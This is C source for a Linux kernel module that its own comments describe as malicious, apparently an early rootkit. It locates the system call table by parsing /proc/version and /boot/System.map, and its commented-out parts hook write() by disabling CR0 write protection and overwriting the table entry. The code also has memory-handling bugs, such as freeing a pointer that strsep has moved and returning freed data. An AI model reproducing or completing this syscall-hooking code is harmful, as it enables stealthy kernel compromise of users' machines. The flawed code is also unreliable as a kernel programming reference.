#include <linux/module.h>  /* Needed by all kernel modules */
#include <linux/kernel.h>  /* Needed for loglevels (KERN_WARNING, KERN_EMERG, KERN_INFO, etc.) */
#include <linux/init.h>    /* Needed for __init and __exit macros. */
#include <linux/unistd.h>  /* sys_call_table __NR_* system call function indices */
#include <linux/fs.h>      /* filp_open */
#include <linux/slab.h>    /* kmalloc */

#include <asm/paravirt.h> /* write_cr0 */
#include <asm/uaccess.h>  /* get_fs, set_fs */

#include "hooks.h"

#define PROC_V    "/proc/version"
#define BOOT_PATH "/boot/System.map-"
#define MAX_VERSION_LEN   256






unsigned long long *syscall_table = NULL;



static int find_sys_call_table (char *kern_ver)
 {
 
    char buf[MAX_VERSION_LEN];
    int i = 0;
    char *filename;
    char *p;
    struct file *f = NULL;
 
    mm_segment_t oldfs;
 
    oldfs = get_fs();
    set_fs (KERNEL_DS);
     
    filename = kmalloc(strlen(kern_ver)+strlen(BOOT_PATH)+1, GFP_KERNEL);
     
    if ( filename == NULL ) {
     
        return -1;
     
    }
     
    memset(filename, 0, strlen(BOOT_PATH)+strlen(kern_ver)+1);
     
    strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));
    strncat(filename, kern_ver, strlen(kern_ver));
     
    printk(KERN_ALERT "\nPath %s\n", filename);
     
    f = filp_open(filename, O_RDONLY, 0);
     
    if ( IS_ERR(f) || ( f == NULL )) {
     
        return -1;
     
    }
 
    memset(buf, 0x0, MAX_VERSION_LEN);
 
    p = buf;
 
    while (vfs_read(f, p+i, 1, &f->f_pos) == 1) {
 
        if ( p[i] == '\n' || i == 255 ) {
         
            i = 0;
             
            if ( (strstr(p, "sys_call_table")) != NULL ) {
                 
                char *sys_string;
                 
                sys_string = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);  
                 
                if ( sys_string == NULL ) { 
                 
                    filp_close(f, 0);
                    set_fs(oldfs);

                    kfree(filename);
     
                    return -1;
     
                }
 
                memset(sys_string, 0, MAX_VERSION_LEN);
                strncpy(sys_string, strsep(&p, " "), MAX_VERSION_LEN);
             
                //syscall_table = (unsigned long long *) kstrtoll(sys_string, NULL, 16);
                syscall_table = kmalloc(sizeof(unsigned long long), GFP_KERNEL);
                kstrtoull(sys_string, 16, syscall_table);
                 
                kfree(sys_string);
                 
                break;
            }
             
            memset(buf, 0x0, MAX_VERSION_LEN);
            continue;
        }
         
        i++;
     
    }
 
    filp_close(f, 0);
    set_fs(oldfs);
     
    kfree(filename);
 
    return 0;
}









char *acquire_kernel_version (void) {
  struct file *proc_version;
  char *full_kernel_version, *parsed_version;

  /*
   * We use this to store the userspace perspective of the filesystem
   * so we can switch back to it after we are done reading the file
   * into kernel memory
   */
  mm_segment_t oldfs;

  /*
   * Standard trick for reading a file into kernel space
   * This is very bad practice. We're only doing it here because
   * we're malicious and don't give a damn about best practices.
   */
  oldfs = get_fs();
  set_fs (KERNEL_DS);

  /*
   * Open the version file in the /proc virtual filesystem
   */
  proc_version = filp_open(PROC_V, O_RDONLY, 0);
  if (IS_ERR(proc_version) || (proc_version == NULL)) {
    return NULL;
  }

  /*
   * Allocate space for the full kernel version info
   */
  full_kernel_version = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);

  /*
   * Zero out memory just to be safe
   */
  memset(full_kernel_version, 0, MAX_VERSION_LEN);

  /*
   * Read version info from /proc virtual filesystem
   */
  vfs_read(proc_version, full_kernel_version, MAX_VERSION_LEN, &(proc_version->f_pos));

  /*
   * Extract the third field from the full version string
   */
  parsed_version = strsep(&full_kernel_version, " ");
  parsed_version = strsep(&full_kernel_version, " ");
  parsed_version = strsep(&full_kernel_version, " ");

  filp_close(proc_version, 0);
  kfree(full_kernel_version);
  
  /*
   * Switch filesystem context back to user space mode
   */
  set_fs(oldfs);

  return parsed_version;
}

/*
 * TODO Find a way to resolve this address dynamically.
 *   For now, find this value using:
 *     sudo cat /boot/System.map-$(uname -r) | grep 'sys_call_table'
 *   And hard code it here.
 */
//unsigned long *syscall_table = (unsigned long *)0xffffffff81801400;
//asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
//asmlinkage int new_write (unsigned int x, const char __user *y, size_t size) {
//  printk(KERN_EMERG "[+] write() hooked.");
//
//  return original_write(x, y, size);
//}

static int __init onload(void) {
  printk(KERN_WARNING "Hello world!\n");
  printk(KERN_EMERG "Version: %s\n", acquire_kernel_version());

  find_sys_call_table(acquire_kernel_version());

  printk(KERN_EMERG "Syscall table address: %llx\n", *syscall_table);

//  write_cr0 (read_cr0 () & (~ 0x10000));
//  original_write = (void *)syscall_table[__NR_write];
//  syscall_table[__NR_write] = &new_write;
//  write_cr0 (read_cr0 () | 0x10000);

  /*
   * A non 0 return means init_module failed; module can't be loaded.
   */
  return 0;
}

static void __exit onunload(void) {
//  write_cr0 (read_cr0 () & (~ 0x10000));
//  syscall_table[__NR_write] = original_write;
//  write_cr0 (read_cr0 () | 0x10000);

  printk(KERN_INFO "Goodbye world!\n");
}

module_init(onload);
module_exit(onunload);
